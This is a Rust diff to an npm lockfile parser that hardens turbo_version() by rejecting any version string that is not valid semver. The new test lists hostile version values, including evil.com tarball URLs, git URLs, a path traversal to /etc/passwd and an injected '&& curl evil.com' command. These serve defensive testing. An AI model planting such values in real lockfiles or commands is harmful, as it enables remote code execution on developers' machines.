@@ -1,5 +1,6 @@
 use std::{any::Any, collections::HashMap};
 
+use semver::Version;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 
@@ -150,7 +151,9 @@ impl Lockfile for NpmLockfile {
 
     fn turbo_version(&self) -> Option<String> {
         let turbo_entry = self.packages.get("node_modules/turbo")?;
-        turbo_entry.version.clone()
+        let version = turbo_entry.version.as_ref()?;
+        Version::parse(version).ok()?;
+        Some(version.clone())
     }
 
     fn human_name(&self, package: &Package) -> Option<String> {
@@ -529,6 +532,43 @@ mod test {
         let lockfile = NpmLockfile::load(include_bytes!("../fixtures/npm-lock.json"))?;
         assert_eq!(lockfile.turbo_version().as_deref(), Some("1.5.5"));
         Ok(())
+    }
+
+    #[test]
+    fn test_turbo_version_rejects_non_semver() {
+        // Malicious version strings that could be used for RCE via npx should be
+        // rejected
+        let malicious_versions = [
+            "file:./malicious.tgz",
+            "https://evil.com/malicious.tgz",
+            "http://evil.com/malicious.tgz",
+            "git+https://github.com/evil/repo.git",
+            "git://github.com/evil/repo.git",
+            "../../../etc/passwd",
+            "1.0.0 && curl evil.com",
+        ];
+
+        for malicious_version in malicious_versions {
+            let json = format!(
+                r#"{{
+                    "lockfileVersion": 3,
+                    "packages": {{
+                        "": {{}},
+                        "node_modules/turbo": {{
+                            "version": "{}"
+                        }}
+                    }}
+                }}"#,
+                malicious_version
+            );
+            let lockfile = NpmLockfile::load(json.as_bytes()).unwrap();
+            assert_eq!(
+                lockfile.turbo_version(),
+                None,
+                "should reject malicious version: {}",
+                malicious_version
+            );
+        }
     }
 
     #[test]
